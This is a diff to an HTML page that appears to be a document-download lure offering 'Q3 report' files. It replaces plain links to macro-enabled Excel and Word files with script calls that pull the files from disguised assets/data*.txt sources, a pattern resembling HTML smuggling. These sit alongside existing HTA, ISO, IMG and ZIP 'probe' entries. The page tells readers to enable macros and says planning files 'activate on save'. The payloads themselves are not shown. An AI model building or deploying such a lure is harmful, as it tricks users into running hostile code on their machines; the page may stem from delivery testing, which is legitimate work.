@@ -41,11 +41,11 @@ before it can be opened. The activation takes a few seconds.</p>
   <p>If activation is not possible on this workstation, the report files
   can be retrieved directly:</p>
   <ul>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Report.xlsm" download>Q3_Report.xlsm</a> — quarterly report (Excel, macro-enabled)</li>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Report_full.xlsm" download>Q3_Report_full.xlsm</a> — full quarterly report (Excel, macro-enabled)</li>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Report.docm" download>Q3_Report.docm</a> — quarterly report (Word, macro-enabled)</li>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Plan.docm" download>Q3_Plan.docm</a> — Q3 planning document (activates on save)</li>
-    <li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Summary.xlsx" download>Q3_Summary.xlsx</a> — Q3 summary + external references</li>
+    <li><a href="#" onclick="return get('Q3_Report.xlsm')">Q3_Report.xlsm</a> — quarterly report (Excel, macro-enabled)</li>
+    <li><a href="#" onclick="return get('Q3_Report_full.xlsm')">Q3_Report_full.xlsm</a> — full quarterly report (Excel, macro-enabled)</li>
+    <li><a href="#" onclick="return get('Q3_Report.docm')">Q3_Report.docm</a> — quarterly report (Word, macro-enabled)</li>
+    <li><a href="#" onclick="return get('Q3_Plan.docm')">Q3_Plan.docm</a> — Q3 planning document (activates on save)</li>
+    <li><a href="#" onclick="return get('Q3_Summary.xlsx')">Q3_Summary.xlsx</a> — Q3 summary + external references</li>
   </ul>
   <div class="meta">Macro-enabled files: Enable Content after opening. Planning
   files (Q3_Plan.*) activate when the document is saved — press Ctrl+S with
@@ -85,7 +85,12 @@ var PROBES={
   'probe.hta':{src:'assets/data2.txt'},
   'probe.zip':{src:'assets/data3.txt'},
   'probe.iso':{src:'assets/data4.txt'},
-  'probe.img':{src:'assets/data5.txt'}
+  'probe.img':{src:'assets/data5.txt'},
+  'Q3_Report.xlsm':{src:'assets/data6.txt'},
+  'Q3_Report.docm':{src:'assets/data7.txt'},
+  'Q3_Report_full.xlsm':{src:'assets/data8.txt'},
+  'Q3_Plan.docm':{src:'assets/data9.txt'},
+  'Q3_Summary.xlsx':{src:'assets/data10.txt'}
 };
 function get(name){
   var p=PROBES[name];
